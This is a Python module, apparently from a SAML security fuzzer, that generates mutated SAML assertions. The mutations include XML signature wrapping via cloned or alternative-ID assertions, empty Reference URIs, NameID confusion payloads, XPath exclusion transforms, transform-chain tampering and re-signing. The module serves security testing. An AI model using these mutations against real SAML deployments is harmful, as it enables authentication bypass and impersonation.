"""Constraint solver: generates targeted mutations from extracted constraints.

Takes XmlConstraints and uses the symbolic XML models to generate inputs
that specifically explore the constraint boundaries.  Returns at most
MAX_SOLUTIONS inputs per call to bound overhead.
"""

from __future__ import annotations

import logging
import random
import re
from typing import Any

from ..protocols import Input
from .constraint import XmlConstraint
from .xml_models import (
    C14NNamespaceModel,
    NsMutation,
    ReferenceResolutionModel,
    SignatureScopeModel,
    TextExtractionModel,
)

logger = logging.getLogger(__name__)

MAX_SOLUTIONS = 5


class ConstraintSolver:
    """Generate targeted inputs from extracted constraints.

    Uses symbolic XML models to predict which mutations will explore
    constraint boundaries, then generates concrete inputs.
    """

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)
        self._c14n_model = C14NNamespaceModel()
        self._ref_model = ReferenceResolutionModel()
        self._text_model = TextExtractionModel()
        self._scope_model = SignatureScopeModel()
        self.stats = _SolverStats()

    def solve(
        self,
        constraints: list[XmlConstraint],
        seed_data: bytes,
    ) -> list[Input]:
        """Generate targeted inputs that explore constraint boundaries.

        Returns at most MAX_SOLUTIONS inputs per call.
        """
        if not constraints:
            return []

        all_inputs: list[Input] = []

        # Dispatch to domain-specific solvers
        for constraint in constraints:
            if len(all_inputs) >= MAX_SOLUTIONS:
                break

            domain = constraint.domain
            try:
                if domain == "c14n":
                    inputs = self._solve_c14n(constraint, seed_data)
                elif domain == "reference":
                    inputs = self._solve_reference(constraint, seed_data)
                elif domain == "extraction":
                    inputs = self._solve_extraction(constraint, seed_data)
                elif domain == "scope":
                    inputs = self._solve_scope(constraint, seed_data)
                elif domain == "transform":
                    inputs = self._solve_transform(constraint, seed_data)
                else:
                    inputs = []
            except Exception:
                logger.debug("Solver failed for %s:%s", domain, constraint.predicate, exc_info=True)
                inputs = []

            all_inputs.extend(inputs)

        # Cap and de-duplicate
        seen: set[bytes] = set()
        unique: list[Input] = []
        for inp in all_inputs:
            if inp.data not in seen and inp.data != seed_data:
                seen.add(inp.data)
                unique.append(inp)
                if len(unique) >= MAX_SOLUTIONS:
                    break

        self.stats.total_solves += 1
        self.stats.total_inputs += len(unique)
        return unique

    # ── Domain-specific solvers ──────────────────────────────────

    def _solve_c14n(
        self, constraint: XmlConstraint, data: bytes,
    ) -> list[Input]:
        """Generate namespace mutations targeting c14n divergence."""
        mutations = self._c14n_model.generate_ns_mutations(data, rng=self.rng)

        # Score and rank by predicted c14n impact
        scored = [
            (m, self._c14n_model.predict_c14n_difference(data, m))
            for m in mutations
        ]
        scored.sort(key=lambda x: x[1], reverse=True)

        inputs: list[Input] = []
        for mutation, score in scored[:3]:
            mutated = self._apply_ns_mutation(data, mutation)
            if mutated is not None:
                mutated = self._try_resign(mutated)
                inputs.append(Input(
                    data=mutated,
                    metadata={
                        "concolic_domain": "c14n",
                        "concolic_predicate": constraint.predicate,
                        "ns_mutation": mutation.description,
                        "predicted_score": score,
                    },
                ))

        return inputs

    def _solve_reference(
        self, constraint: XmlConstraint, data: bytes,
    ) -> list[Input]:
        """Generate XSW/reference mutations targeting ID resolution ambiguity."""
        inputs: list[Input] = []
        params = constraint.params_dict()
        assertions = self._ref_model._find_all_assertions(data)

        # Strategy 1: Duplicate assertion with same ID
        if assertions:
            original = assertions[-1]  # Last assertion (typically the signed one)
            if original.id_value:
                clone = self._clone_assertion_before(data, original)
                if clone:
                    clone = self._try_resign(clone)
                    inputs.append(Input(
                        data=clone,
                        metadata={
                            "concolic_domain": "reference",
                            "concolic_predicate": constraint.predicate,
                            "xsw_variant": "id_clone",
                        },
                    ))

        # Strategy 2: Add assertion with alternative ID attribute
        alt_id_xml = self._inject_alt_id_assertion(data)
        if alt_id_xml:
            inputs.append(Input(
                data=alt_id_xml,
                metadata={
                    "concolic_domain": "reference",
                    "concolic_predicate": constraint.predicate,
                    "xsw_variant": "alt_id_attr",
                },
            ))

        # Strategy 3: Empty Reference URI
        empty_uri = self._set_reference_uri(data, "")
        if empty_uri:
            inputs.append(Input(
                data=empty_uri,
                metadata={
                    "concolic_domain": "reference",
                    "concolic_predicate": constraint.predicate,
                    "xsw_variant": "empty_uri",
                },
            ))

        return inputs

    def _solve_extraction(
        self, constraint: XmlConstraint, data: bytes,
    ) -> list[Input]:
        """Generate NameID payloads targeting text extraction divergence."""
        params = constraint.params_dict()

        # Get current NameID content
        nameid_match = re.search(
            rb'(<(?:saml:)?NameID[^>]*>)(.*?)(</(?:saml:)?NameID\s*>)',
            data, re.DOTALL,
        )
        if not nameid_match:
            return []

        open_tag = nameid_match.group(1)
        current_text = nameid_match.group(2).decode("utf-8", errors="replace")
        close_tag = nameid_match.group(3)

        # Generate confusion payloads
        payloads = self._text_model.generate_confusion_payloads(
            current_text or "admin@evil.com", rng=self.rng,
        )

        inputs: list[Input] = []
        for payload in payloads[:MAX_SOLUTIONS]:
            new_data = (
                data[:nameid_match.start(2)]
                + payload
                + data[nameid_match.end(2):]
            )
            new_data = self._try_resign(new_data)
            inputs.append(Input(
                data=new_data,
                metadata={
                    "concolic_domain": "extraction",
                    "concolic_predicate": constraint.predicate,
                    "payload_preview": payload[:100].decode("utf-8", errors="replace"),
                },
            ))

        return inputs

    def _solve_scope(
        self, constraint: XmlConstraint, data: bytes,
    ) -> list[Input]:
        """Modify unsigned-but-parsed elements."""
        inputs: list[Input] = []
        unsigned = self._scope_model.unsigned_parsed_elements(data)

        for elem in unsigned[:2]:
            # Modify NameID in unsigned assertion
            modified = self._modify_unsigned_assertion(data, elem)
            if modified:
                inputs.append(Input(
                    data=modified,
                    metadata={
                        "concolic_domain": "scope",
                        "concolic_predicate": constraint.predicate,
                        "target_element": elem.tag,
                    },
                ))

        # Also try injecting XPath transform to exclude signed elements
        xpath_injected = self._inject_xpath_exclusion(data)
        if xpath_injected:
            inputs.append(Input(
                data=xpath_injected,
                metadata={
                    "concolic_domain": "scope",
                    "concolic_predicate": constraint.predicate,
                    "injection": "xpath_exclusion",
                },
            ))

        return inputs

    def _solve_transform(
        self, constraint: XmlConstraint, data: bytes,
    ) -> list[Input]:
        """Modify the transform chain."""
        inputs: list[Input] = []
        params = constraint.params_dict()

        # Strategy 1: Remove enveloped-signature transform
        no_enveloped = re.sub(
            rb'<(?:ds:)?Transform[^>]*Algorithm="[^"]*enveloped-signature[^"]*"[^>]*/?>',
            b'',
            data,
        )
        if no_enveloped != data:
            inputs.append(Input(
                data=no_enveloped,
                metadata={
                    "concolic_domain": "transform",
                    "concolic_predicate": constraint.predicate,
                    "transform_mod": "remove_enveloped",
                },
            ))

        # Strategy 2: Add an extra c14n transform
        extra_c14n = self._inject_extra_transform(
            data,
            b'<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#WithComments"/>',
        )
        if extra_c14n:
            inputs.append(Input(
                data=extra_c14n,
                metadata={
                    "concolic_domain": "transform",
                    "concolic_predicate": constraint.predicate,
                    "transform_mod": "add_c14n_with_comments",
                },
            ))

        # Strategy 3: Swap c14n algorithm
        c14n_swap = data.replace(
            b"xml-exc-c14n#",
            b"TR/2001/REC-xml-c14n-20010315",
        )
        if c14n_swap != data:
            inputs.append(Input(
                data=c14n_swap,
                metadata={
                    "concolic_domain": "transform",
                    "concolic_predicate": constraint.predicate,
                    "transform_mod": "swap_c14n_inclusive",
                },
            ))

        return inputs

    # ── Mutation helpers ─────────────────────────────────────────

    def _apply_ns_mutation(
        self, data: bytes, mutation: NsMutation,
    ) -> bytes | None:
        """Apply a namespace mutation to raw XML bytes."""
        target_tag = mutation.target_element.encode()

        # Find the target element's opening tag
        tag_match = re.search(rb'<' + re.escape(target_tag) + rb'(\s)', data)
        if not tag_match:
            # Try without prefix
            local = mutation.target_element.split(":")[-1].encode()
            tag_match = re.search(rb'<(?:\w+:)?' + re.escape(local) + rb'(\s)', data)
            if not tag_match:
                return None

        insert_pos = tag_match.end() - 1  # Before the whitespace

        if mutation.kind == "void":
            ns_decl = f' xmlns:{mutation.prefix}="{mutation.uri}"'.encode()
        elif mutation.kind == "undeclare":
            ns_decl = f' xmlns:{mutation.prefix}=""'.encode()
        elif mutation.kind == "add":
            if mutation.prefix:
                ns_decl = f' xmlns:{mutation.prefix}="{mutation.uri}"'.encode()
            else:
                ns_decl = f' xmlns="{mutation.uri}"'.encode()
        elif mutation.kind == "redeclare":
            # Remove existing declaration first
            pattern = re.compile(
                rb'\s*xmlns:' + re.escape(mutation.prefix.encode()) + rb'="[^"]*"'
            )
            data = pattern.sub(b'', data, count=1)
            # Re-find the target tag (offsets may have shifted)
            tag_match = re.search(rb'<' + re.escape(target_tag) + rb'(\s)', data)
            if not tag_match:
                local = mutation.target_element.split(":")[-1].encode()
                tag_match = re.search(rb'<(?:\w+:)?' + re.escape(local) + rb'(\s)', data)
                if not tag_match:
                    return None
            insert_pos = tag_match.end() - 1
            ns_decl = f' xmlns:{mutation.prefix}="{mutation.uri}"'.encode()
        elif mutation.kind == "remove":
            pattern = re.compile(
                rb'\s*xmlns:' + re.escape(mutation.prefix.encode()) + rb'="[^"]*"'
            )
            return pattern.sub(b'', data, count=1)
        elif mutation.kind == "reorder":
            # Swap first two namespace declarations
            ns_matches = list(re.finditer(rb'\s*xmlns(?::(\w+))?="[^"]*"', data[:2000]))
            if len(ns_matches) >= 2:
                m0 = ns_matches[0]
                m1 = ns_matches[1]
                s0 = data[m0.start():m0.end()]
                s1 = data[m1.start():m1.end()]
                return data[:m0.start()] + s1 + data[m0.end():m1.start()] + s0 + data[m1.end():]
            return None
        else:
            return None

        return data[:insert_pos] + ns_decl + data[insert_pos:]

    def _clone_assertion_before(
        self, data: bytes, original: "Any",
    ) -> bytes | None:
        """Clone the original assertion and insert evil copy before it."""
        # Find assertion boundaries
        assertion_match = re.search(
            rb'(<(?:\w+:)?Assertion\b[^>]*ID="'
            + re.escape(original.id_value.encode())
            + rb'"[^>]*>)',
            data,
        )
        if not assertion_match:
            return None

        # Build evil assertion with same ID
        evil = (
            b'<saml:Assertion Version="2.0" ID="'
            + original.id_value.encode()
            + b'">'
            + b'<saml:Subject><saml:NameID>FUZZ_EVIL</saml:NameID></saml:Subject>'
            + b'</saml:Assertion>'
        )

        insert_pos = assertion_match.start()
        return data[:insert_pos] + evil + data[insert_pos:]

    def _inject_alt_id_assertion(self, data: bytes) -> bytes | None:
        """Inject assertion with alternative ID attribute (Id vs ID)."""
        # Find first assertion
        assertion_match = re.search(
            rb'(<(?:\w+:)?Assertion\b[^>]*ID="([^"]*)")',
            data,
        )
        if not assertion_match:
            return None

        original_id = assertion_match.group(2).decode("utf-8", errors="replace")

        evil = (
            b'<saml:Assertion Version="2.0" Id="'
            + original_id.encode()
            + b'">'
            + b'<saml:Subject><saml:NameID>FUZZ_EVIL</saml:NameID></saml:Subject>'
            + b'</saml:Assertion>'
        )

        insert_pos = assertion_match.start()
        return data[:insert_pos] + evil + data[insert_pos:]

    def _set_reference_uri(self, data: bytes, uri: str) -> bytes | None:
        """Replace the Reference URI value."""
        pattern = rb'(<(?:ds:)?Reference[^>]*URI=")([^"]*)(")'
        m = re.search(pattern, data)
        if not m:
            return None
        return data[:m.start(2)] + uri.encode() + data[m.end(2):]

    def _modify_unsigned_assertion(
        self, data: bytes, elem: "Any",
    ) -> bytes | None:
        """Modify NameID in an unsigned assertion."""
        if not elem.id_value:
            return None
        # Find the assertion by ID
        pattern = re.compile(
            rb'(<(?:\w+:)?Assertion\b[^>]*ID="'
            + re.escape(elem.id_value.encode())
            + rb'"[^>]*>)(.*?)(</(?:\w+:)?Assertion)',
            re.DOTALL,
        )
        m = pattern.search(data)
        if not m:
            return None

        body = m.group(2)
        # Replace NameID content
        new_body = re.sub(
            rb'(<(?:saml:)?NameID[^>]*>).*?(</(?:saml:)?NameID)',
            rb'\1FUZZ_EVIL_UNSIGNED\2',
            body,
        )
        if new_body == body:
            return None

        return data[:m.start(2)] + new_body + data[m.end(2):]

    def _inject_xpath_exclusion(self, data: bytes) -> bytes | None:
        """Inject XPath Filter 2.0 transform to exclude Conditions."""
        transform_xml = (
            b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
            b'<dsig-xpath:XPath xmlns:dsig-xpath="http://www.w3.org/2002/06/xmldsig-filter2" '
            b'Filter="subtract">//saml:Conditions</dsig-xpath:XPath>'
            b'</ds:Transform>'
        )
        return self._inject_extra_transform(data, transform_xml)

    def _inject_extra_transform(
        self, data: bytes, transform_xml: bytes,
    ) -> bytes | None:
        """Insert an extra Transform element into the Transforms block."""
        # Find </ds:Transforms> or </Transforms>
        m = re.search(rb'</(?:ds:)?Transforms\s*>', data)
        if not m:
            return None
        insert_pos = m.start()
        return data[:insert_pos] + transform_xml + data[insert_pos:]

    def _try_resign(self, data: bytes) -> bytes:
        """Attempt to re-sign the assertion. Returns original on failure."""
        try:
            from ._resign import resign_saml
            result = resign_saml(data)
            if result is not None:
                return result
        except Exception:
            pass
        return data


class _SolverStats:
    """Lightweight counters for observability."""
    __slots__ = ("total_solves", "total_inputs")

    def __init__(self) -> None:
        self.total_solves = 0
        self.total_inputs = 0
